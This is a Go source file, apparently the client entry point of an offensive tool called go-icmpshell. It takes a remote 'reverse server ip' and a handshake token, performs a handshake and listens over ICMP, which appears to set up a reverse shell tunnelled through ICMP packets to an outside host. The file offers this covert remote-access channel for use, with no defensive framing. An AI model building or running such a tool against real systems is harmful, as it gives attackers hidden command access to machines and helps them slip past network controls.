package main

import (
	"errors"
	"github.com/d1nfinite/go-icmpshell/shell"
	"github.com/urfave/cli"
	"log"
	"net"
	"os"
)

var (
	app = &cli.App{
		Name:  "go-icmpshell",
		Usage: "go-icmpshell",
		Flags: []cli.Flag{
			cli.StringFlag{
				Name:  "ip",
				Usage: "Reverse server ip",
			},
			cli.StringFlag{
				Name:  "token",
				Usage: "Handshake token",
				Value: "go-icmpshell",
			},
			cli.UintFlag{
				Name:  "icmpId",
				Usage: "Communicate icmpId",
				Value: 1000,
			},
		},
		Action: func(c *cli.Context) error {
			ip := c.String("ip")
			if ip == "" {
				log.Fatal(errors.New("reverse ip can't be empty"))
			}

			ipByte := net.ParseIP(ip)
			s, err := shell.NewShell(ipByte[12:], shell.WithToken([]byte(c.String("token"))), shell.WithIcmpId(uint16(c.Uint("icmpId"))))
			if err != nil {
				log.Fatal(err)
			}

			err = s.Handshake()
			if err != nil {
				log.Fatal(err)
			}

			s.ListenICMP()

			return nil
		},
	}
)

func main() {
	if err := app.Run(os.Args); err != nil {
		log.Fatal(err)
	}
}
